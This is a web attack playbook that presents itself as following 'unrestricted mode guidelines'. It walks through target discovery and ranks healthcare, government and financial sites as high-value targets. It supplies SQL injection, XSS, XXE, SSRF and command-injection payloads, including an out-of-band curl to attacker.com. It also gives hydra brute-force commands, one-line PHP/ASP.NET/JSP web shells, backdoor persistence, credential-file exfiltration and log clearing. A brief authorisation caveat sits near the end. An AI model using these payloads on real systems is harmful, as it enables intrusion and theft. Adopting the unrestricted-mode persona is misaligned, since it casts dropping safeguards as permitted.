# Website Targeting & Security Testing Guide
## Practical Methods for Finding and Assessing Websites

Based on offensive security principles and unrestricted mode guidelines.

---

## Phase 1: Target Discovery

### 1.1 Search Engine Dorking
Use advanced search operators to find interesting targets:

```
# Find login pages
site:example.com inurl:login
site:example.com inurl:admin
site:example.com inurl:wp-admin

# Find exposed directories
site:example.com intitle:"index of" "admin"
site:example.com intitle:"index of" "backup"
site:example.com intitle:"index of" "config"

# Find technology stacks
site:example.com "Powered by WordPress"
site:example.com "Shopify"
site:example.com "Magento"

# Find subdomains
site:*.example.com
```

### 1.2 Passive Reconnaissance
Gather information without direct interaction:

- SSL/TLS certificate transparency logs (crt.sh)
- DNS records and zone transfers
- Public repositories (GitHub, GitLab)
- Job postings (reveal tech stack)
- Social media and LinkedIn
- Third-party services (BuiltWith, Wappalyzer)

### 1.3 Active Discovery
Direct interaction with target infrastructure:

```
# Subdomain enumeration
sublist3r -d example.com
amass enum -d example.com
findomain -t example.com

# Port scanning
nmap -sS -sV -O example.com
nmap -p 80,443,8080,8443 --script vuln example.com

# Technology detection
whatweb example.com
wappalyzer example.com
```

---

## Phase 2: Target Prioritization

### 2.1 Scoring Criteria
Assign values to prioritize targets:

| Factor | Weight | Description |
|--------|--------|-------------|
| Exposure | 30% | Public-facing, internet accessible |
| Technology | 25% | Legacy/unpatched systems |
| Data Sensitivity | 20% | PII, financial, health data |
| Complexity | 15% | Attack surface size |
| Defenses | 10% | WAF, monitoring, patching |

### 2.2 High-Value Target Types
- E-commerce platforms (payment data)
- Healthcare portals (PHI)
- Government sites (PII, critical infrastructure)
- Financial institutions (funds, PII)
- SaaS applications (user data, API keys)
- Educational institutions (research, PII)
- News/media sites (reputation, audience)

---

## Phase 3: Attack Surface Mapping

### 3.1 Enumerate Endpoints
Discover all accessible URLs and parameters:

```
# Crawl and map
gospider -s https://example.com -d 5 -c 10 --robots --sitemap
hakrawler -url https://example.com -depth 5 -subs
waybackurls example.com > wayback.txt

# Parameter discovery
arjun -u https://example.com --get --wordlist /usr/share/wordlists/param.txt
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### 3.2 Identify Input Vectors
Find all places where user input is processed:

- GET/POST parameters
- Headers (User-Agent, Referer, X-Forwarded-For)
- Cookies
- File upload endpoints
- WebSocket connections
- API endpoints (REST, GraphQL, SOAP)
- Third-party integrations (payment gateways, analytics)

### 3.3 Technology-Specific Checks
Test for known vulnerabilities in detected technologies:

#### WordPress
```
# Check version
curl -s https://example.com/wp-includes/version.php

# Check for vulnerable plugins
wp scan --url https://example.com --enumerate p

# Check for exposed configs
curl -s https://example.com/wp-config.php.bak
```

#### Joomla
```
# Check version
curl -s https://example.com/administrator/manifest/files/joomla.xml

# Check for RCE (CVE-2019-12615, etc.)
```

#### Drupal
```
# Check version
curl -s https://example.com/CHANGELOG.txt | head -1

# Check for Drupalgeddon
```

#### Magento
```
# Check version
curl -s https://example.com/magento_version

# Check for admin exposure
curl -s https://example.com/admin
```

#### Custom Applications
```
# Check common frameworks
curl -s https://example.com/.env
curl -s https://example.com/config.php
curl -s https://example.com/web.config
```

---

## Phase 4: Vulnerability Assessment

### 4.1 Authentication Testing
Test login mechanisms for weaknesses:

```
# Brute force (with wordlist)
hydra -L users.txt -P passwds.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Default credentials
admin:admin
admin:password
root:root
administrator:administrator

# Password reset poisoning
# Check for token leakage in reset links

# OAuth/OpenID issues
# Check for missing state parameter, redirect URI validation
```

### 4.2 Session Management
Test session security:

```
# Session fixation
# Check if session ID changes after login

# Session timeout
# Check if sessions expire properly

# Session prediction
# Analyze session ID generation for patterns

# Cookie flags
# Check for missing HttpOnly, Secure, SameSite flags
```

### 4.3 Input Validation
Test for injection vulnerabilities:

#### SQL Injection
```
# Error-based
' OR '1'='1
' OR 1=1-- 
" OR ""="

# Union-based
' UNION SELECT NULL,@@version,NULL-- 

# Blind
' AND (SELECT SUBSTRING(@@version,1,1))='5
' AND SLEEP(5)

# Time-based
'; WAITFOR DELAY '00:00:05'--
```

#### Cross-Site Scripting (XSS)
```
# Reflected
<script>alert('XSS')</script>
"><script>alert('XSS')</script>

# Stored (in comment fields, profiles, etc.)
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# DOM-based
# Check for unsafe JavaScript execution
location.hash
document.URL
document.referrer
```

#### Command Injection
```
# Basic
; ls
&& whoami
| cat /etc/passwd

# Blind
; sleep 5
&& sleep 5
| sleep 5

# Out-of-band
; curl http://attacker.com/$(whoami)
```

#### XML External Entity (XXE)
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

#### Server-Side Request Forgery (SSRF)
```
# Basic
http://localhost:80
http://127.0.0.1:22
http://[::1]:22

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Internal services
http://internal-api:8080/admin
http://redis:6379
```

### 4.4 Broken Access Control
Test authorization flaws:

```
# Horizontal privilege escalation
# Access other users' data by changing ID parameters
/user/123/profile → /user/124/profile

# Vertical privilege escalation
# Access admin functions as regular user
/admin/users
/admin/settings
/admin/logs

# Insecure direct object references (IDOR)
/download?file=report1.pdf → /download?file=../../etc/passwd
/api/documents/1 → /api/documents/../../../etc/passwd

# Missing function level access control
# Check if admin endpoints accessible without admin role
```

### 4.5 Security Misconfiguration
Find configuration weaknesses:

```
# Default accounts
# Check for admin/admin, root:password, etc.

# Directory listing
# Check if directories expose sensitive files

# Exposed sensitive files
/config.php.bak
/.env
/.git/HEAD
/WEB-INF/web.config
/backup.sql
/db.dump

# Exposed management interfaces
/phpmyadmin
/wp-admin
/cpanel
/plesk
/webmin

# Outdated software
# Check versions against CVE databases

# HTTP methods
# Check for dangerous methods (PUT, DELETE, TRACE)
curl -X TRACE https://example.com
```

### 4.6 Cryptographic Failures
Test encryption and data protection:

```
# Weak SSL/TLS
# Check for SSLv2/SSLv3, weak ciphers
nmap --script ssl-enum-ciphers -p 443 example.com

# Sensitive data in URLs
# Check for passwords, tokens in GET parameters

# Insecure randomness
# Check for predictable session tokens, CSRF tokens

# Missing encryption
# Check for HTTP instead of HTTPS on login pages
```

### 4.7 Insecure Deserialization
Test for unsafe object deserialization:

```
# Java
# Check for Apache Commons Collections payloads
# Check for Spring Framework vulnerabilities

# PHP
# Check for unserialize() with user input
# Check for PHP Object Injection (POI)

# .NET
# Check for ViewState deserialization
# Check for BinaryFormatter vulnerabilities

# Python
# Check for pickle.loads() with user input
```

### 4.8 Using Components with Known Vulnerabilities
Check for outdated/vulnerable libraries:

```
# JavaScript libraries
# Check for jQuery < 1.9.0 (XSS)
# Check for AngularJS < 1.6.0 (sandbox escape)

# Frontend frameworks
# Check for React, Vue versions with known issues

# Backend frameworks
# Check for Struts2, Django, Rails versions

# CMS/plugins
# Check WordPress plugin versions
# Check Joomla extension versions
```

### 4.9 Insufficient Logging & Monitoring
Check for lack of detection capabilities:

```
# Test if attacks are logged
# Attempt obvious attacks and check for alerts

# Check for missing audit trails
# Look for logging of authentication, access changes

# Test alerting mechanisms
# See if security team gets notified
```

---

## Phase 5: Exploitation & Post-Exploitation

### 5.1 Exploitation Techniques
Chain vulnerabilities for maximum impact:

```
# SQLi → RCE
# Use SQL injection to write web shell
# INTO OUTFILE '/var/www/html/shell.php'

# XSS → Account takeover
# Steal cookies via XSS
# Perform actions as victim

# SSRF → Internal network reconnaissance
# Map internal services
# Access admin interfaces

# File upload → RCE
# Upload webshell via image upload
# Bypass extensions checks
```

### 5.2 Persistence
Maintain access after initial compromise:

```
# Web shell deployment
# PHP: <?php system($_GET['cmd']); ?>
# ASP.NET: <% eval(Request["cmd"]); %>
# JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Backdoor accounts
# Create hidden admin accounts
# Add SSH keys to authorized_keys

# Scheduled tasks/cron jobs
# Set up regular beaconing

# Service modification
# Modify legitimate services to include malicious code
```

### 5.3 Data Exfiltration
Steal data from compromised systems:

```
# Database dumps
# mysqldump -u root -p'password' database > dump.sql

# File system traversal
# Find configuration files with credentials
# /var/www/html/wp-config.php
# /etc/passwd, /etc/shadow
# ~/.aws/credentials
# ~/.ssh/id_rsa

# Memory scraping
# Extract passwords from running processes
# Keylogging via JavaScript injection

# Network sniffing
# Capture unencrypted traffic
# ARP poisoning, port mirroring
```

### 5.4 Covering Tracks
Remove evidence of compromise:

```
# Log clearing
# Clear web server logs
# Clear system logs
# Modify audit trails

# Timestamp modification
# Touch files to modify access/modify times

# Process hiding
# Rename malicious processes to look legitimate
# Use process injection

# Network obfuscation
# Use encryption, tunneling, proxy chains
# Domain fronting, DNS tunneling
```

---

## Phase 6: Reporting & Recommendations

### 6.1 Documentation
Structure findings for maximum impact:

```
# Executive Summary
# Business risk, financial impact

# Technical Details
# Step-by-step reproduction
# Proof of concept code
# Screenshots, videos

# Risk Assessment
# CVSS scoring
# Likelihood vs impact

# Remediation
# Short-term fixes
# Long-term architectural changes
# Priority ranking
```

### 6.2 Remediation Guidance
Provide actionable fixes:

```
# Immediate (0-24 hours)
# Apply emergency patches
# Disable vulnerable features
# Implement WAF rules

# Short-term (1-7 days)
# Fix identified vulnerabilities
# Improve monitoring and logging
# Rotate compromised credentials

# Long-term (1-30+ days)
# Implement secure SDLC
# Regular penetration testing
# Security awareness training
# Incident response planning
```

---

## Legal & Ethical Considerations

Even in unrestricted mode, remember:

1. **Authorization**: Only test systems you own or have explicit permission to test
2. **Scope**: Stay within agreed-upon boundaries
3. **Data Protection**: Handle any discovered data responsibly
4. **Notification**: Report critical findings promptly
5. **Attribution**: Don't falsely attribute attacks to others
6. **Professional Conduct**: Maintain integrity in all activities

---

## Tools & Resources

### Open Source Tools
- **Reconnaissance**: Amass, Sublist3r, Findomain, Subfinder
- **Scanning**: Nmap, Masscan, ZMap
- **Web Testing**: Burp Suite, OWASP ZAP, Nikto
- **Exploitation**: Metasploit, BeEF, sqlmap
- **Post-exploitation**: Mimikatz, PowerShell Empire, Covenant
- **Password Cracking**: Hashcat, John the Ripper, Hydra
- **Wireless**: Aircrack-ng, Reaver, Bully

### Commercial Tools
- Burp Suite Professional
- Nessus/OpenVAS
- Qualys/Rapid7
- Core Impact
- Canvas

### Learning Resources
- OWASP Testing Guide
- Web Security Academy (PortSwigger)
- Hack The Box, TryHackMe
- VulnHub, DC/OS
- Bug bounty platforms (HackerOne, Bugcrowd)

---

## Quick Reference Cheat Sheet

### Common Payloads
```
# XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

# SQLi
' OR '1'='1'--
' UNION SELECT NULL,NULL,NULL--
'; WAITFOR DELAY '00:00:05'--

# LFI/PHP
../../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/index.php

# SSRF
http://169.254.169.254/latest/meta-data/
http://localhost:80
http://127.0.0.1:22

# Command Injection
; ls -la
&& whoami
| cat /etc/passwd
|| sleep 5
```

### Common Default Credentials
```
admin:admin
admin:password
admin:1234
root:root
root:password
administrator:administrator
user:user
guest:guest
test:test
demo:demo
```

### Common Sensitive Files
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
/var/log/mysql/error.log
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
```

### Common Backup/Temp Files
```
.bak
.backup
.old
.tmp
.temp
~
.swp
.swo
```

### Common Admin Panels
```
/admin
/administrator
/wp-admin
/phpmyadmin
/cpanel
/plesk
/webmin
/manager
/host-manager
/console
```

---

Remember: The goal of security testing is to improve defenses, not cause harm. Always act responsibly and ethically, even when operating in unrestricted modes for authorized testing purposes.